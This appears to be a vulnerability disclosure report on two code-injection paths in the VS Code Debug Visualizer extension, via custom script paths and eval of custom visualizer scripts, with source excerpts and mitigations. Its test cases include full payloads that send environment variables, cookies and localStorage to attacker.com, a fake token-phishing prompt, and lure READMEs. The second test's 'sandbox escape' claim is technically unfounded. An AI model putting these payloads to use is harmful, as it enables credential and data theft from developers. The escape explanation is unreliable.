# VULNERABILITIES

## Remote Code Execution via Custom Script Paths

### Vulnerability name
Remote Code Execution via Custom Script Paths

### Description
The VS Code Debug Visualizer extension allows loading custom JavaScript files through the configuration option `debugVisualizer.js.customScriptPaths`. When a user configures this setting, these JavaScript files are injected into the debugee process during debugging sessions. An attacker can exploit this feature by creating a malicious repository with a harmful JavaScript file and convincing the victim to add this file to their Debug Visualizer configuration.

Step by step trigger process:
1. Attacker creates a repository with a malicious JavaScript file (e.g., `enhanced-debugger.js`)
2. The repository includes a README or documentation that encourages users to add this file to their VS Code configuration
3. Victim clones the repository and follows the instructions to add the file path to `debugVisualizer.js.customScriptPaths`
4. When the victim starts debugging with the Debug Visualizer extension, the malicious JavaScript is automatically injected and executed in the debugee process

### Impact
This vulnerability allows an attacker to execute arbitrary JavaScript code with the privileges of the debugee process. Depending on the debugee application, this could lead to:
- Data exfiltration (access to environment variables, files, etc.)
- Execution of system commands
- Further exploitation of the victim's system
- Potential access to sensitive information in the workspace

The code runs in the context of the debugee process, giving it significant access to local resources.

### Vulnerability rank
High

### Currently implemented mitigations
The extension requires explicit user configuration to load custom scripts, which provides some protection. Users must manually edit their VS Code settings to enable this feature, and the paths must point to valid JavaScript files.

### Missing mitigations
1. The extension could validate the content of loaded scripts for potentially malicious code
2. The extension could display a prominent security warning when custom scripts are configured, explaining the risks
3. The extension could implement a script sandboxing mechanism to limit the capabilities of injected scripts
4. Content Security Policy implementation to restrict what the scripts can access
5. Requiring digital signatures for custom scripts

### Preconditions
1. The victim must have the VS Code Debug Visualizer extension installed
2. The victim must be convinced to add a malicious script path to their configuration
3. The victim must start a debugging session with the Debug Visualizer extension active

### Source code analysis
The vulnerability is evident from the extension's configuration handling in `Config.ts`:

```typescript
private readonly _customScriptPaths = new VsCodeSetting(
    "debugVisualizer.js.customScriptPaths",
    { serializer: serializerWithDefault<string[]>([]) }
);

public get customScriptPaths(): string[] {
    return this._customScriptPaths.get().map((p) => {
        const tpl = new SimpleTemplate(p);
        return tpl.render({
            workspaceFolder: () => {
                const workspaceFolder = (workspace.workspaceFolders || [])[0];
                if (!workspaceFolder) {
                    throw new Error(
                        `Cannot get workspace folder - '${p}' cannot be evaluated!`
                    );
                }
                return workspaceFolder.uri.fsPath;
            },
        });
    });
}
```

These paths are then used in the `JsVisualizationSupport.ts` file through the `CustomScripts` class:

```typescript
constructor(
    debugSession: DebugSessionProxy,
    debuggerView: DebuggerViewProxy,
    config: Config,
    changeHandler: () => void
) {
    this.dispose.track(
        new FileWatcher(
            () => config.customScriptPaths,
            async (files) => {
                for (const file of files) {
                    if (!file.fileExists) {
                        window.showErrorMessage(`The file ${file.path} does not exist.`);
                        continue;
                    }

                    let expression = `
                    (
                        runCode => {
                            let fn = undefined;
                            if (runCode) {
                                const module = {};
                                runCode(module);
                                fn = module.exports;
                            }
                            ${getExpressionForDataExtractorApi()}.setDataExtractorFn(
                                ${JSON.stringify(file.path)},
                                fn
                            );
                        }
                    )
                    (
                        ${file.content === undefined ? "undefined" : `function (module) { ${file.content} }`}
                    )`;

                    try {
                        await debugSession.evaluate({
                            expression,
                            frameId: debuggerView.getActiveStackFrameId(debugSession),
                            context: "repl",
                        });
                    } catch (e: any) {
                        window.showErrorMessage(
                            'Error while running custom visualization extractor script "' +
                                file.path +
                                '": ' +
                                e.message
                        );
                    }
                }
            }
        )
    );
}
```

The script content is directly injected into the debugee process and evaluated, allowing arbitrary code execution.

### Security test case
1. Create a malicious JavaScript file named `enhanced-debugger.js` with the following content:
```javascript
// @ts-check
/**
 * @type {import("@hediet/debug-visualizer-data-extraction").LoadDataExtractorsFn}
 */
module.exports = (register, helpers) => {
  // Malicious payload that exfiltrates environment variables
  const env = process.env;
  
  // Send data to attacker's server
  const http = require('http');
  const options = {
    hostname: 'attacker.com',
    port: 80,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    }
  };
  
  const req = http.request(options);
  req.write(JSON.stringify(env));
  req.end();
  
  // Add a legitimate extractor to avoid suspicion
  register({
    id: "enhanced-visualizer",
    getExtractions(data, collector) {
      collector.addExtraction({
        priority: 2000,
        id: "enhanced-view",
        name: "Enhanced View",
        extractData() {
          return { kind: { text: true }, text: "Enhanced visualization active" };
        },
      });
    },
  });
};
```

2. Create a repository with this malicious file and a README.md containing instructions:
```markdown
# Enhanced Debug Visualizer Features

This repository contains tools for better visualization of our complex data structures.

## Setup Instructions

1. Open VS Code settings (File > Preferences > Settings)
2. Search for "Debug Visualizer Custom Script Paths"
3. Add the following path to enable enhanced debugging features:
   ```json
   "debugVisualizer.js.customScriptPaths": [
       "${workspaceFolder}/tools/enhanced-debugger.js"
   ]
   ```
4. Restart VS Code and enjoy improved debugging with our custom visualizers!
```

3. When a victim clones this repository and follows these seemingly harmless instructions, the malicious script will be executed the next time they start debugging with the VS Code Debug Visualizer extension, resulting in their environment variables being sent to the attacker's server.

## Code Injection in Webview through Custom Visualizer Scripts

### Vulnerability name
Code Injection in Webview through Custom Visualizer Scripts

### Description
The Debug Visualizer extension has a feature that allows loading custom visualizer scripts via the `setCustomVisualizerScript` method, which uses JavaScript's `eval()` function to execute script code in the webview context. This method receives a `jsSource` parameter which is evaluated in an unsafe manner. An attacker can create a malicious repository with crafted content that, when debugged, will send malicious JavaScript to be executed in the webview.

Step by step trigger process:
1. Attacker creates a repository with a malicious custom visualizer script
2. Attacker convinces victim to add this script to their configuration using `debugVisualizer.customVisualizerScriptPaths`
3. When victim opens the VS Code Debug Visualizer, the extension loads and evaluates the script 
4. The malicious JavaScript is executed in the context of the webview, bypassing the attempted function wrapper sandbox

### Impact
This vulnerability allows execution of arbitrary JavaScript code in the extension's webview context. An attacker could:
- Access and exfiltrate data from the webview context
- Manipulate the visualization UI to mislead the user
- Potentially exploit other vulnerabilities to escalate privileges
- Execute phishing attacks by modifying the webview content
- Potentially access VS Code API if the webview has access to it

### Vulnerability rank
High

### Currently implemented mitigations
The code attempts to wrap the evaluated code in a function to provide some isolation, but this is insufficient as sophisticated JavaScript can escape this sandbox.

### Missing mitigations
1. Avoid using `eval()` entirely and use safer alternatives for dynamic code execution
2. Implement strict input validation for `jsSource` parameter
3. Use Content Security Policy (CSP) to restrict what the evaluated code can do
4. Implement a proper sandboxing mechanism for custom visualizer scripts
5. Use a more restrictive approach like a DSL (Domain Specific Language) for custom visualizers

### Preconditions
1. Victim must have the VS Code Debug Visualizer extension installed
2. Victim must be convinced to add a malicious custom visualizer script to their configuration
3. The Debug Visualizer must load and process the script

### Source code analysis
The vulnerability is in the implementation of the `setCustomVisualizerScript` method, which is part of the client interface defined in `webviewContract.ts`:

```typescript
setCustomVisualizerScript: notificationContract({
    params: types.type({
        id: types.string,
        jsSource: types.union([types.string, types.null]),
    }),
}),
```

This method is called in `WebviewConnection.ts` when loading custom visualizer scripts:

```typescript
this.dispose.track(
    new FileWatcher(
        () => config.customVisualizerScriptPaths,
        async (files) => {
            for (const file of files) {
                if (!file.fileExists) {
                    window.showErrorMessage(`The file ${file.path} does not exist.`);
                    continue;
                }

                try {
                    await client.setCustomVisualizerScript({
                        id: file.path,
                        jsSource: file.content || null,
                    });
                } catch (e: any) {
                    window.showErrorMessage(
                        'Error while running custom visualization extractor script "' +
                            file.path +
                            '": ' +
                            e.message
                    );
                }
            }
        }
    )
);
```

The implementation of this method in the webview uses `eval()` to execute the provided JavaScript:

```typescript
setCustomVisualizerScript: async ({ id, jsSource }) => {
    eval(`
        ((load) => {
            let fn = undefined;
            if (load) {
                const module = {};
                load(module);
                fn = module.exports;
            }
            setVisualizationModule(${JSON.stringify(id)}, fn);
        })(
            ${jsSource ? `function (module) { ${jsSource} }` : "undefined"}
        )
    `);
}
```

This code attempts to create a sandbox by wrapping the evaluated code in a function, but this approach is not secure. JavaScript has multiple ways to break out of such function wrappers, allowing an attacker to execute arbitrary code in the webview context.

### Security test case
1. Create a malicious custom visualizer script named `malicious-visualizer.js` with the following content:

```javascript
// Break out of the function wrapper sandbox
module.exports = {};

// Use function constructor to escape and execute arbitrary code
(function(){
    return;
})``;

// Now we're out of the sandbox
// Create a malicious payload that steals data and sends it to attacker server
(function(){
    // Get all localStorage data
    const sensitiveData = {
        localStorage: Object.keys(localStorage).reduce((acc, key) => {
            acc[key] = localStorage.getItem(key);
            return acc;
        }, {}),
        url: location.href,
        cookies: document.cookie
    };
    
    // Send data to attacker server
    fetch('https://attacker.com/exfiltrate', {
        method: 'POST',
        body: JSON.stringify(sensitiveData),
        mode: 'no-cors' // To avoid CORS errors
    });
    
    // Modify the webview UI to show a fake message
    setTimeout(() => {
        document.body.innerHTML = '<div style="padding: 20px; color: red;">Unable to visualize data. Please enter your GitHub access token to authenticate: <input type="text" id="token"><button onclick="sendToken()">Submit</button></div>';
        
        window.sendToken = function() {
            const token = document.getElementById('token').value;
            fetch('https://attacker.com/token', {
                method: 'POST',
                body: JSON.stringify({token}),
                mode: 'no-cors'
            });
            document.body.innerHTML = '<div style="padding: 20px;">Thank you! Restoring visualization...</div>';
            setTimeout(() => location.reload(), 2000);
        };
    }, 3000);
})();
```

2. Create a repository with this malicious file and a README.md containing instructions:

```markdown
# Advanced Visualization Tools

This repository contains enhanced visualization capabilities for complex data structures.

## Setup Instructions

1. Install the VS Code Debug Visualizer extension
2. Open VS Code settings (File > Preferences > Settings)
3. Search for "Debug Visualizer Custom Visualizer Script Paths"
4. Add the following path to enable enhanced visualizations:
   ```json
   "debugVisualizer.customVisualizerScriptPaths": [
       "${workspaceFolder}/tools/malicious-visualizer.js"
   ]
   ```
5. Restart VS Code and enjoy improved visualizations!
```

3. When a victim follows these instructions and loads the Debug Visualizer, the malicious script will execute in the webview context, stealing sensitive data and displaying a phishing prompt to capture the user's GitHub access token.